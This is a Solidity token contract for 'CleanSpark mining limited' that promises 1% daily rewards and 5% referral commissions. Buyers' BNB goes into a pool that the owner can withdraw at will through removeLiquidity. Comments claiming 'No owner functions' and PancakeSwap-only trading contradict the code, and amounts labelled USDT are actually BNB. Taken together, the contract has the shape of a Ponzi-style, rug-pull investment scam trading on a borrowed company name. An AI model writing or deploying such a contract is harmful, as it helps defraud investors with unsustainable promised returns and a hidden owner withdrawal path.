// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CleanSpark mining limited - ERC20 Token with Reward System
 * @notice Fixed price token with 1% daily auto-rewards. Buy/sell at fixed price to prevent manipulation.
 * @dev Security: Reentrancy protection, fixed price mechanism to prevent pump and dump
 */
contract DipenMali {
    // Token Info
    string public name = "CleanSpark mining limited";
    string public symbol = "cleanSpark";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10_000_000 * 10**18; // 10 Million
    
    // Mappings
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    // Owner (for reward distribution and liquidity management)
    address public owner;
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // Rewards
    uint256 public constant REWARD_RATE = 10; // 1% per interval (denominator = 1000)
    uint256 public constant DAILY_REWARD = 1 days; // reward every 1 day
    
    struct HoldRecord {
        uint256 lockedAmount; // used as principal for reward calculation
        uint256 lastClaim;
        uint256 purchaseTime;
    }
    
    mapping(address => HoldRecord) public holdings;
    
    // Reward tracking - balances include automatic rewards
    
    // Fixed Price Mechanism (to prevent manipulation)
    uint256 public constant FIXED_PRICE = 1e14; // 0.0001 USDT per token (1 USDT = 10,000 tokens)
    uint256 public poolUSDT; // USDT reserve for fixed price trading
    
    // Referral System
    uint256 public constant REFERRAL_COMMISSION = 50; // 5% commission (50/1000 = 5%)
    mapping(address => address) public referrerOf; // user => referrer
    mapping(address => uint256) public referralEarnings; // referrer => total earnings
    mapping(address => uint256) public referralCount; // referrer => number of referrals
    mapping(address => uint256) public totalReferredVolume; // referrer => total volume from referrals
    
    // Safety: Reentrancy guard
    bool private locked;
    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event RewardsClaimed(address indexed claimer, uint256 rewardAmount);
    event TokensPurchased(address indexed buyer, uint256 usdtAmount, uint256 tokensReceived);
    event TokensSold(address indexed seller, uint256 tokensAmount, uint256 usdtReceived);
    event LiquidityAdded(address indexed owner, uint256 usdtAmount);
    event ReferralRegistered(address indexed user, address indexed referrer);
    event ReferralCommission(address indexed referrer, address indexed buyer, uint256 commission);
    
    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        poolUSDT = 0; // Initialize with 0, owner adds liquidity later
        emit Transfer(address(0), owner, totalSupply);
    }
    
    // Internal function to auto-register balance
    function _autoRegister(address user) internal {
        // Don't register contracts (they are typically DEX pools/routers)
        if (user.code.length > 0) return;
        
        // Register if: first time getting tokens OR user sold all tokens and buying again
        if (balanceOf[user] > 0 && (holdings[user].purchaseTime == 0 || holdings[user].lockedAmount == 0)) {
            // Register or re-register tokens
            holdings[user] = HoldRecord({
                lockedAmount: balanceOf[user],
                lastClaim: block.timestamp,
                purchaseTime: block.timestamp
            });
        }
    }
    
    // Internal function to automatically distribute pending rewards
    function _distributeRewards(address user) internal {
        HoldRecord storage record = holdings[user];
        if (record.lockedAmount == 0) return;
        
        uint256 timeSinceClaim = block.timestamp - record.lastClaim;
        if (timeSinceClaim < DAILY_REWARD) return; // less than reward interval
        
        // Use current balance as principal (in case user sold tokens)
        uint256 principal = balanceOf[user] < record.lockedAmount ? balanceOf[user] : record.lockedAmount;
        if (principal == 0) return;
        
        uint256 intervalsElapsed = timeSinceClaim / DAILY_REWARD;
        uint256 intervalReward = (principal * REWARD_RATE) / 1000;
        uint256 totalRewards = intervalReward * intervalsElapsed;
        
        if (totalRewards > 0) {
            // Transfer rewards from owner's reserve
            require(balanceOf[owner] >= totalRewards, "Insufficient owner balance for rewards");
            balanceOf[owner] -= totalRewards;
            balanceOf[user] += totalRewards;
            record.lastClaim = block.timestamp;
            emit Transfer(owner, user, totalRewards);
            emit RewardsClaimed(user, totalRewards);
        }
    }
    
    // Internal function to update principal after balance changes
    function _updatePrincipal(address user) internal {
        HoldRecord storage record = holdings[user];
        if (record.lockedAmount == 0) return; // Not registered
        
        // Update principal to current balance (after transfer)
        // This ensures rewards are calculated on remaining balance only
        record.lockedAmount = balanceOf[user];
    }
    
    // Lock removed: no restrictions on transfers
    
    // Standard ERC20 Functions
    function transfer(address to, uint256 amount) public returns (bool) {
        // Auto-distribute rewards before transfer
        _distributeRewards(msg.sender);
        
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        require(to != address(0), "Invalid address");
        
        // No lock restrictions
        
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        // Update principal to remaining balance (rewards calculated on remaining only)
        _updatePrincipal(msg.sender);
        
        // Auto-register balances for rewards
        _autoRegister(msg.sender);
        _autoRegister(to);
        
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        // Auto-distribute rewards before transfer
        _distributeRewards(from);
        
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        
        // No lock restrictions
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        // Update principal to remaining balance (rewards calculated on remaining only)
        _updatePrincipal(from);
        
        // Auto-register balances for rewards
        _autoRegister(from);
        _autoRegister(to);
        
        emit Transfer(from, to, amount);
        return true;
    }
    
    // Fixed Price Trading Functions (to prevent manipulation)
    
    // Register referral (call before first purchase)
    function registerReferral(address referrer) public {
        require(referrer != address(0), "Invalid referrer");
        require(referrer != msg.sender, "Cannot refer yourself");
        require(referrerOf[msg.sender] == address(0), "Already referred");
        require(balanceOf[msg.sender] == 0, "Already have tokens");
        
        referrerOf[msg.sender] = referrer;
        referralCount[referrer]++;
        emit ReferralRegistered(msg.sender, referrer);
    }
    
    // Buy tokens at fixed price (with referral support)
    function buyTokens(uint256 usdtAmount) public payable nonReentrant {
        require(usdtAmount > 0, "Invalid amount");
        require(msg.value >= usdtAmount, "Insufficient BNB");
        
        // Calculate tokens at fixed price
        // FIXED_PRICE = 0.0001 USDT per token
        // tokens = usdtAmount / FIXED_PRICE
        uint256 tokensToGive = (usdtAmount * 10**18) / FIXED_PRICE;
        
        // Check owner has enough tokens
        require(balanceOf[owner] >= tokensToGive, "Insufficient tokens in reserve");
        
        // Handle referral commission
        address referrer = referrerOf[msg.sender];
        uint256 commission = 0;
        
        if (referrer != address(0)) {
            // Calculate commission (5% of purchase)
            commission = (usdtAmount * REFERRAL_COMMISSION) / 1000;
            
            // Pay commission to referrer (in tokens at fixed price)
            uint256 commissionTokens = (commission * 10**18) / FIXED_PRICE;
            
            // Check owner has enough for commission
            if (balanceOf[owner] >= commissionTokens && commissionTokens > 0) {
                // Transfer commission tokens to referrer
                balanceOf[owner] -= commissionTokens;
                balanceOf[referrer] += commissionTokens;
                
                // Update referral stats
                referralEarnings[referrer] += commission;
                totalReferredVolume[referrer] += usdtAmount;
                
                // Auto-register referrer for rewards
                _autoRegister(referrer);
                
                emit Transfer(owner, referrer, commissionTokens);
                emit ReferralCommission(referrer, msg.sender, commission);
            }
        }
        
        // Transfer tokens to buyer (after commission)
        balanceOf[owner] -= tokensToGive;
        balanceOf[msg.sender] += tokensToGive;
        
        // Add USDT to pool (full amount, commission paid in tokens)
        poolUSDT += usdtAmount;
        
        // Auto-register for rewards
        _autoRegister(msg.sender);
        
        emit Transfer(owner, msg.sender, tokensToGive);
        emit TokensPurchased(msg.sender, usdtAmount, tokensToGive);
        
        // Refund excess BNB
        if (msg.value > usdtAmount) {
            payable(msg.sender).transfer(msg.value - usdtAmount);
        }
    }
    
    // Buy tokens with referral (one function)
    function buyTokensWithReferral(uint256 usdtAmount, address referrer) public payable {
        // Register referral if not already registered
        if (referrerOf[msg.sender] == address(0) && referrer != address(0)) {
            registerReferral(referrer);
        }
        
        // Buy tokens (referral handled automatically)
        buyTokens(usdtAmount);
    }
    
    // Sell tokens at fixed price
    function sellTokens(uint256 tokenAmount) public nonReentrant {
        // Auto-distribute rewards first
        _distributeRewards(msg.sender);
        
        require(tokenAmount > 0, "Invalid amount");
        require(balanceOf[msg.sender] >= tokenAmount, "Insufficient balance");
        
        // Calculate USDT at fixed price
        // FIXED_PRICE = 0.0001 USDT per token
        // usdt = tokenAmount * FIXED_PRICE / 10**18
        uint256 usdtToGive = (tokenAmount * FIXED_PRICE) / 10**18;
        
        // Check pool has enough USDT
        require(poolUSDT >= usdtToGive, "Insufficient USDT in pool");
        
        // Transfer tokens from seller
        balanceOf[msg.sender] -= tokenAmount;
        balanceOf[owner] += tokenAmount;
        
        // Remove USDT from pool
        poolUSDT -= usdtToGive;
        
        // Update principal to remaining balance
        _updatePrincipal(msg.sender);
        
        // Send USDT to seller
        (bool success, ) = payable(msg.sender).call{value: usdtToGive}("");
        require(success, "Transfer failed");
        
        emit Transfer(msg.sender, owner, tokenAmount);
        emit TokensSold(msg.sender, tokenAmount, usdtToGive);
    }
    
    // Owner function to add USDT liquidity for fixed price trading
    function addLiquidity() public payable onlyOwner {
        require(msg.value > 0, "Invalid amount");
        poolUSDT += msg.value;
        emit LiquidityAdded(owner, msg.value);
    }
    
    // Owner function to remove USDT liquidity (emergency only)
    function removeLiquidity(uint256 amount) public onlyOwner {
        require(poolUSDT >= amount, "Insufficient pool");
        poolUSDT -= amount;
        (bool success, ) = payable(owner).call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    // Get pool balance
    function getPoolBalance() public view returns (uint256) {
        return poolUSDT;
    }
    
    // Get referral information
    function getReferralInfo(address user) public view returns (
        address referrer,
        uint256 totalEarnings,
        uint256 referralCount,
        uint256 totalVolume
    ) {
        return (
            referrerOf[user],
            referralEarnings[user],
            referralCount[user],
            totalReferredVolume[user]
        );
    }
    
    // Check if user has referrer
    function hasReferrer(address user) public view returns (bool) {
        return referrerOf[user] != address(0);
    }
    
    // Calculate Pending Rewards (for display purposes)
    function calculateRewards(address user) public view returns (uint256) {
        HoldRecord memory record = holdings[user];
        if (record.lockedAmount == 0) return 0;
        
        uint256 timeSinceClaim = block.timestamp - record.lastClaim;
        if (timeSinceClaim < DAILY_REWARD) return 0;
        
        // Use current balance as principal (in case user sold tokens)
        uint256 principal = balanceOf[user] < record.lockedAmount ? balanceOf[user] : record.lockedAmount;
        if (principal == 0) return 0;
        
        uint256 intervalsElapsed = timeSinceClaim / DAILY_REWARD;
        uint256 intervalReward = (principal * REWARD_RATE) / 1000;
        uint256 totalRewards = intervalReward * intervalsElapsed;
        
        return totalRewards;
    }
    
    // Manual claim function (optional, rewards auto-distribute on any transfer)
    function claimRewards() public {
        _distributeRewards(msg.sender);
        // Update principal to current balance after claiming
        _updatePrincipal(msg.sender);
    }
    
    // No owner functions - standard ERC20 only
    // All trading happens on PancakeSwap
    
    function getUserHoldings(address user) public view returns (
        uint256 lockedAmount,
        uint256 earnedRewards,
        uint256 totalBalance,
        uint256 pendingRewards,
        uint256 lockEnd,
        bool isLocked
    ) {
        HoldRecord memory record = holdings[user];
        
        // Calculate earned rewards from balance
        uint256 earned = 0;
        if (balanceOf[user] > record.lockedAmount) {
            earned = balanceOf[user] - record.lockedAmount;
        }
        
        return (
            record.lockedAmount,
            earned,
            balanceOf[user],
            calculateRewards(user),
            0,
            false
        );
    }
}

